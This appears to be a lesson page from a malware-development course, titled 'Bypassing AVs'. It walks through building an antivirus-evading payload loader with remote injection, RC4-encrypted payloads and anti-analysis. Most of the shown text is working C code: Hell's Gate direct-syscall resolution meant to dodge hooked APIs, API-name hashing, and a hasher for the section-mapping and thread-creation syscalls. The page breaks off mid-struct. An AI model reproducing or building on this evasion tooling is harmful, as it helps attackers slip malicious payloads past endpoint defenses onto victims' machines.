@@ -1,0 +1,1593 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Bypassing AVs</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+        <div id="bypassing-avs" class="scroll-mt-24 pt-6 sm:pt-8 pb-3 border-b border-[#212b54] mt-8 sm:mt-12 mb-4 sm:mb-6 flex items-center justify-between group">
+            <h2 class="text-xl sm:text-2xl font-bold text-white tracking-tight flex items-center gap-2.5 sm:gap-3">
+                <i data-lucide="sparkles" class="w-4 h-4 sm:w-5 sm:h-5 text-[var(--accent)] flex-shrink-0"></i>
+                <span>Bypassing AVs</span>
+            </h2>
+            <a href="#bypassing-avs" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition" class="opacity-0 group-hover:opacity-100 text-[#cbd5e1] hover:text-[var(--accent)] text-xs flex items-center gap-1 font-mono transition p-1.5 rounded hover:bg-[var(--accent-soft)]" title="Copy link">
+                <i data-lucide="link" class="w-4 h-4"></i>
+            </a>
+        </div><h3 id="introduction" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Introduction</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">So far, numerous methods and techniques to create and execute a payload loader that can bypass a variety of software security programs have been demonstrated. This module will work to construct a feature-rich payload loader from the ground up to reinforce what has been taught in the previous modules.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Create an empty Visual Studio project and follow along to keep up with this module.</p><h3 id="payload-loader-features" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Payload Loader Features</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The implemented payload loader will have the following features:</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Remote code injection support</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Mapping injection using direct syscalls via Hell&#x27;s Gate</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>API Hashing</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Anti-Analysis functionality</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>RC4 payload encryption</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Brute forcing the decryption key</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>No CRT library imports</span></div><h3 id="hell-s-gate-setup" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Hell's Gate Setup</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">This loader utilizes payload injection via direct syscalls obtained using Hell&#x27;s Gate. To begin, one must create <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Structs.h</code>, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">HellsGate.c</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">HellAsm.asm</code> files. These files include the necessary functions to execute direct syscalls. The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Structs.h</code> file is used to save Windows undocumented structures and is included in subsequent C files. It contains structure definitions such as <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">PEB</code>, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">TEB</code>, and more, which are necessary for implementing Hell&#x27;s Gate.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">HellAsm.asm</code> file will be the same as the one from the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/hellsgate.asm" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">repository</a>. As for <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">HellsGate.c</code>, it will have the following functions.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>HellsGate.c</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">ASM / x64</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-nasm">#include &lt;Windows.h&gt;#include &quot;Structs.h&quot;
+
+
+PTEB RtlGetThreadEnvironmentBlock() {
+#if _WIN64return (PTEB)__readgsqword(0x30);
+#elsereturn (PTEB)__readfsdword(0x16);
+#endif}
+
+
+BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory) {
+	// Get DOS header
+	PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)pModuleBase;
+	if (pImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE) {
+		return FALSE;
+	}
+
+	// Get NT headers
+	PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pModuleBase + pImageDosHeader-&gt;e_lfanew);
+	if (pImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE) {
+		return FALSE;
+	}
+
+	// Get the EAT
+	*ppImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pModuleBase + pImageNtHeaders-&gt;OptionalHeader.DataDirectory[0].VirtualAddress);
+	return TRUE;
+}
+
+BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
+	PDWORD pdwAddressOfFunctions   = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfFunctions);
+	PDWORD pdwAddressOfNames       = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNames);
+	PWORD pwAddressOfNameOrdinales = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNameOrdinals);
+
+	for (WORD cx = 0; cx &lt; pImageExportDirectory-&gt;NumberOfNames; cx++) {
+		PCHAR pczFunctionName  = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
+		PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];
+
+		if (djb2(pczFunctionName) == pVxTableEntry-&gt;uHash) {
+			pVxTableEntry-&gt;pAddress = pFunctionAddress;
+
+			// Quick and dirty fix in case the function has been hooked
+			WORD cw = 0;
+			while (TRUE) {
+				// check if syscall, in this case we are too far
+				if (*((PBYTE)pFunctionAddress + cw) == 0x0f &amp;&amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
+					return FALSE;
+
+				// check if ret, in this case we are also probaly too far
+				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
+					return FALSE;
+
+				// First opcodes should be :
+				//    MOV R10, RCX
+				//    MOV RCX, &lt;syscall&gt;
+				if (*((PBYTE)pFunctionAddress + cw) == 0x4c
+					&amp;&amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
+					&amp;&amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
+					&amp;&amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
+					&amp;&amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
+					&amp;&amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
+					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
+					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
+					pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low;
+					break;
+				}
+
+				cw++;
+			};
+		}
+	}
+
+	if (pVxTableEntry-&gt;wSystemCall != NULL)
+		return TRUE;
+	else
+		return FALSE;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The code above does not have the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VX_TABLE_ENTRY</code> structure or the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">djb2</code> function defined. To solve this, two new files will be created: <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">WinApi.c</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Common.h</code>.</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">WinApi.c</code> - This file is used to store the CRT library replacement functions and the string hashing functions used in Hell&#x27;s Gate and the API Hahsing implementation.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Common.h</code> - This file provides common function prototypes to enable calling a function from a different file, as well as custom structure definitions, hashes values of the syscalls, and WinAPIs.</span></div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L92" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">djb2</a> string hashing function is replaced with the following <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">HashStringJenkinsOneAtATime32BitA/W</code> functions, hence changing the original string hashing algorithm used in Hell&#x27;s Gate.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>WinApi.c</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#include &lt;Windows.h&gt;#include &quot;Structs.h&quot;#include &quot;Common.h&quot;
+
+
+UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
+{
+	SIZE_T Index = 0;
+	UINT32 Hash = 0;
+	SIZE_T Length = lstrlenA(String);
+
+	while (Index != Length)
+	{
+		Hash += String[Index++];
+		Hash += Hash &lt;&lt; INITIAL_SEED;
+		Hash ^= Hash &gt;&gt; 6;
+	}
+
+	Hash += Hash &lt;&lt; 3;
+	Hash ^= Hash &gt;&gt; 11;
+	Hash += Hash &lt;&lt; 15;
+
+	return Hash;
+}
+
+
+UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
+{
+	SIZE_T Index = 0;
+	UINT32 Hash = 0;
+	SIZE_T Length = lstrlenW(String);
+
+	while (Index != Length)
+	{
+		Hash += String[Index++];
+		Hash += Hash &lt;&lt; INITIAL_SEED;
+		Hash ^= Hash &gt;&gt; 6;
+	}
+
+	Hash += Hash &lt;&lt; 3;
+	Hash ^= Hash &gt;&gt; 11;
+	Hash += Hash &lt;&lt; 15;
+
+	return Hash;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>Common.h</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#pragma once#include &lt;Windows.h&gt;// Seed of the HashStringJenkinsOneAtATime32BitA/W funtion in &#x27;WinApi.c&#x27;
+#define INITIAL_SEED	8
+
+UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
+UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);
+
+#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))// These are function prototypes - functions are defined in &#x27;HellsGate.c&#x27;
+PTEB RtlGetThreadEnvironmentBlock();
+BOOL GetImageExportDirectory(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY* ppImageExportDirectory);
+BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry);
+
+// These are functions prototypes - functions are defined in &#x27;HellAsm.asm&#x27;
+extern VOID HellsGate(WORD wSystemCall);
+extern HellDescent();</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Define the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">VX_TABLE_ENTRY</code> in the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Common.h</code> file, then update the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">HellsGate.c</code> file to include it and utilize <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">HASHA</code> instead of <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">djb2</code> as the hashing function.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>VX_TABLE_ENTRY</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef struct _VX_TABLE_ENTRY {
+	PVOID   pAddress;
+	UINT32	uHash;
+	WORD    wSystemCall;
+} VX_TABLE_ENTRY, * PVX_TABLE_ENTRY;</code></pre>
+        </div><h3 id="calculating-syscall-hashes" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Calculating Syscall Hashes</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">A new project must be created in order to calculate the hash values of the syscalls used and print them to the console. The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Hasher</code> project will have one C file which is shown below.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><strong>Hasher.c</strong></p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;#define STR &quot;_JOAA&quot;#define INITIAL_SEED 8
+
+
+UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String)
+{
+	SIZE_T Index = 0;
+	UINT32 Hash = 0;
+	SIZE_T Length = lstrlenA(String);
+
+	while (Index != Length)
+	{
+		Hash += String[Index++];
+		Hash += Hash &lt;&lt; INITIAL_SEED;
+		Hash ^= Hash &gt;&gt; 6;
+	}
+
+	Hash += Hash &lt;&lt; 3;
+	Hash ^= Hash &gt;&gt; 11;
+	Hash += Hash &lt;&lt; 15;
+
+	return Hash;
+}
+
+
+UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String)
+{
+	SIZE_T Index = 0;
+	UINT32 Hash = 0;
+	SIZE_T Length = lstrlenW(String);
+
+	while (Index != Length)
+	{
+		Hash += String[Index++];
+		Hash += Hash &lt;&lt; INITIAL_SEED;
+		Hash ^= Hash &gt;&gt; 6;
+	}
+
+	Hash += Hash &lt;&lt; 3;
+	Hash ^= Hash &gt;&gt; 11;
+	Hash += Hash &lt;&lt; 15;
+
+	return Hash;
+}
+
+
+
+int main() {
+
+	printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtCreateSection&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtCreateSection&quot;));
+	printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtMapViewOfSection&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtMapViewOfSection&quot;));
+	printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtUnmapViewOfSection&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtUnmapViewOfSection&quot;));
+	printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtClose&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtClose&quot;));
+	printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtCreateThreadEx&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtCreateThreadEx&quot;));
+	printf(&quot;#define %s%s \t0x%0.8X \n&quot;, &quot;NtWaitForSingleObject&quot;, STR, HashStringJenkinsOneAtATime32BitA(&quot;NtWaitForSingleObject&quot;));
+
+  return 0;
+}</code></pre>
+        </div><h3 id="hasher-results" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Hasher Results</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Once compiled and ran, the program will generate the following results which should be copied to the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">Common.h</code> file.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#212b54] bg-[#070b1c] shadow-2xl p-2 sm:p-3 flex flex-col items-center group transition-all duration-300 hover:border-[var(--accent)]">
+            <img src="../../assets_img/av-bypass-116769871-25449179-cdfb-412b-899f-1744ac77246b.png" class="rounded-xl max-w-full h-auto cursor-zoom-in group-hover:scale-[1.01] transition-all duration-300 shadow-inner" loading="lazy" onclick="openImageModal(this.src, '')" />
+        </div>
+            
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Additionally, the new <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L14" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">VX_TABLE</a> structure definition must be updated to include the syscalls that will be utilized.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef struct _VX_TABLE {
+
+	VX_TABLE_ENTRY NtCreateSection;
+	VX_TABLE_ENTRY NtMapViewOfSection;
+	VX_TABLE_ENTRY NtUnmapViewOfSection;
